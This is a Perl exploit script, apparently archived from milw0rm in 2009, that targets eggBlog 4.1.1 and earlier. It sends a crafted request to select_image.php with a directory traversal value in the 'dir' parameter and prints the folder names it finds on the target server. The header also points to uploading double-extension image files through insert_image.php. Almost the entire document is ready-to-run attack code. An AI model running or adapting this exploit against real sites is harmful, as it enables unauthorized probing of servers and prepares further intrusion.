<html><head><title>eggBlog <= 4.1.1 Local Directory Transversal Exploit</title></head><pre>#!/usr/bin/perl 
#
# eggBlog &lt;= 4.1.1 Local Directory Transversal Exploit
# 
# by Juri Gianni aka yeat - staker[at]hotmail[dot]it
# Visit http://zeroidentity.org
#
# Description
# ----------------------------------------------------
# eggBlog contains one flaw that allows an attacker to
# carry out a local directory transversal attack. 
# The issue is due to 'select_image.php' script not 
# properly sanitizing user input supplied to the 'dir'
# GET variable.
# -----------------------------------------------------
# Note: you may upload image files with double ext on
# _lib/openwysiwyg/addons/imagelibrary/insert_image.php
# -----------------------------------------------------

use LWP::UserAgent;


my $domain = $ARGV[0];
my $folder = $ARGV[1] || &amp;usage;

exploit($folder);


sub usage()
{
      print &quot;eggBlog &lt;= 4.1.1 Local Directory Transversal Exploit\n&quot;;
      print &quot;Usage: perl xpl.pl localhost/eggBlog ../../\n&quot;;
      print &quot;Visit http://zeroidentity.org\n&quot;;
      exit;
}      


sub exploit()
{
      my $param = shift @_ || die &quot;1 parameter required\n&quot;; 
       
      my $response = undef;
      my @director = undef;
      
      my $lib = new LWP::UserAgent;
      
      $lib-&gt;agent('Lynx (textmode)');
      $lib-&gt;timeout(5);
      
      $response = $lib-&gt;get(&quot;http://$domain/_lib/openwysiwyg/addons/imagelibrary/select_image.php?dir=$param&quot;);
      
      @director = $response-&gt;content =~ /&lt;strong&gt;(.+?)&lt;\/strong&gt;/ig;
      
      for (my $i=0;$i&lt;=scalar(@director);$i++) {
         print $director[$i].&quot;\n&quot;;
      }   
}      

# milw0rm.com [2009-05-11]</pre></html>